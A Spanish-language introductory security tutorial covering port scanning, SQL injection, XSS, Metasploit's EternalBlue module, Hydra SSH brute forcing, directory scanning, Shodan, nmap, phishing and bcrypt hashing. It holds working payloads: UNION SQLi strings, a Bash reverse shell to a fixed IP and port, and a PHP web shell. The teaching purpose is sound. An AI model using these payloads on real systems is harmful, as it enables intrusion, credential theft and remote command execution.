Análisis de un script de Python simple (Scan de Puertos)

Este es un ejemplo de cómo mostrar código. El siguiente script escanea puertos abiertos en una IP local. Útil para auditorías de red básicas y demostraciones de conectividad.


import socket

def scan_port(ip, port):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(0.1) # Reducir el tiempo de espera
        result = s.connect_ex((ip, port))
        if result == 0:
            print(f"[+] Puerto {port} en {ip} ABIERTO")
        s.close()
    except Exception as e:
        # print(f"Error escaneando puerto {port}: {e}") # Para depuración
        pass

target_ip = '127.0.0.1' # Cambia esto a la IP que quieras escanear (con permiso)
print(f"Escaneando puertos en {target_ip}...")
for port in range(1, 1025): # Escanea los puertos bien conocidos
    scan_port(target_ip, port)
print("Escaneo completado.")

Concepto: Inyección SQL Avanzada

Profundicemos en la inyección SQL, una de las vulnerabilidades más comunes. No solo consiste en `' OR '1'='1`, sino en extraer bases de datos enteras o manipular la lógica de una aplicación. Aquí un ejemplo conceptual de UNION-based SQLi.


' ORDER BY 1-- -
' UNION SELECT @@version, user(), database()-- -

Este fragmento ilustra cómo un atacante podría intentar obtener información sobre la base de datos (versión, usuario actual, nombre de la DB) si la aplicación es vulnerable a inyecciones SQL ciegas o basadas en errores.

Payload XSS Básico

Cross-Site Scripting (XSS) permite inyectar scripts maliciosos en páginas web. Un payload reflejado simple podría ser:


<script>alert('XSS exitoso!')</script>

Este ejemplo solo muestra una alerta, pero un atacante podría robar cookies de sesión o redirigir al usuario.

Comprendiendo Metasploit: Un Resumen

Metasploit Framework es una herramienta poderosa para el desarrollo y ejecución de exploits. No es solo una herramienta de "hacking", sino una plataforma de prueba de penetración. Aquí un ejemplo de uso básico del módulo `msfconsole` para buscar vulnerabilidades:


msfconsole
search type:exploit platform:windows smb
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 192.168.1.100
set LHOST 192.168.1.5
exploit

Este es un flujo de trabajo típico para un pentester que intenta usar un exploit conocido como EternalBlue. La comprensión profunda de cómo funciona cada paso es crucial.

Fuerza Bruta SSH con Hydra

Hydra es una herramienta popular para ataques de fuerza bruta. Aquí se muestra cómo intentar adivinar credenciales SSH (Secure Shell) usando un diccionario de contraseñas.


hydra -L users.txt -P passwords.txt ssh://192.168.1.1 --json output.json

El uso de `users.txt` y `passwords.txt` debe ser siempre con fines éticos y sobre sistemas con autorización explícita.

Introducción a los Payloads (Concepto)

En ciberseguridad, un payload es la parte de un exploit que realiza la acción deseada por el atacante (ej. obtener una shell inversa, cargar malware). No es el exploit en sí, sino lo que el exploit "entrega". Un payload sencillo para una shell inversa de Bash podría ser:


bash -i >& /dev/tcp/192.168.1.5/4444 0>&1

Este comando conecta una shell de Bash a una IP y puerto específicos. Esto se debe usar SOLO en entornos controlados y con permiso explícito.

Dirb y Dirbuster son herramientas para escanear directorios y archivos ocultos en servidores web. Esto ayuda a descubrir puntos de entrada o información sensible.


dirb http://target.com /usr/share/wordlists/dirb/common.txt

Explicando el OWASP Top 10 (Ejemplo de A01:2021 - Broken Access Control)

El OWASP Top 10 es una lista de las vulnerabilidades de seguridad web más críticas. "Broken Access Control" ocurre cuando los usuarios pueden acceder a funciones o datos sin la autorización adecuada.


# URL vulnerable donde un usuario no administrador puede ver el perfil de administrador
GET /admin/users/edit?id=1 HTTP/1.1
Cookie: sessionid=ABCD123

Si un usuario normal puede cambiar `id=1` (que es el administrador) o acceder a `/admin/` sin ser un admin, eso es control de acceso roto.

Reconocimiento Pasivo con Shodan

Shodan es un motor de búsqueda para dispositivos conectados a Internet. Permite el reconocimiento pasivo al buscar por IPs, puertos abiertos, servicios y vulnerabilidades sin interactuar directamente con el objetivo.


# Búsqueda de cámaras web con título "webcamXP"
webcamXP country:"US"

# Búsqueda de servidores Apache con puerto 8080 abierto
apache port:8080

Shodan es una herramienta increíblemente útil para ver la huella digital de una organización.

Uso Básico de Nmap

Nmap (Network Mapper) es una utilidad gratuita y de código abierto para el descubrimiento de redes y auditorías de seguridad. Aquí un comando básico para un escaneo de puertos agresivo:


nmap -A -T4 192.168.1.1/24

El argumento `-A` habilita la detección del sistema operativo, la detección de versiones, el escaneo de scripts y el traceroute. `-T4` acelera el escaneo.

Entendiendo Phishing (Concepto)

El phishing es una técnica de ingeniería social para engañar a las personas y obtener información sensible, como nombres de usuario, contraseñas y detalles de tarjetas de crédito. No hay un "código" per se, pero se basa en la manipulación.


# Ejemplo conceptual de una URL de phishing
http://login-banco-falso.com/login.php?return_to=banco-real.com

La clave es la suplantación de identidad y la creación de una falsa sensación de urgencia o credibilidad.

Exploit Kit (Concepto)

Un exploit kit es una suite de software automatizada que explota vulnerabilidades en el software cliente (navegadores, plugins) para instalar malware. Son la base de muchas infecciones drive-by-download.

No se puede proporcionar un código, pero es importante entender cómo funcionan para implementar defensas robustas, como mantener el software actualizado.

Herramientas para Hashing de Contraseñas (Ejemplo Python)

El hashing es fundamental para almacenar contraseñas de forma segura. Nunca se deben guardar contraseñas en texto plano. Aquí un ejemplo en Python usando `bcrypt`.


import bcrypt

password = b"mi_contrasena_segura"
hashed_password = bcrypt.hashpw(password, bcrypt.gensalt())

print(f"Contraseña original: {password}")
print(f"Contraseña hasheada: {hashed_password}")

# Para verificar
if bcrypt.checkpw(password, hashed_password):
    print("¡Contraseña verificada correctamente!")
else:
    print("Contraseña incorrecta.")

Este código demuestra cómo hashear y verificar contraseñas, una práctica crucial en la seguridad de aplicaciones.

Web Shells: Acceso Persistente (Concepto)

Una web shell es un script malicioso subido a un servidor web que permite a un atacante ejecutar comandos de forma remota a través del navegador. Es una forma de mantener el acceso.


<?php system($_GET['cmd']); ?>

Este es un ejemplo muy simple de una web shell PHP. Si se sube a un servidor vulnerable, un atacante podría ir a `http://victim.com/shell.php?cmd=ls -la` para listar directorios.
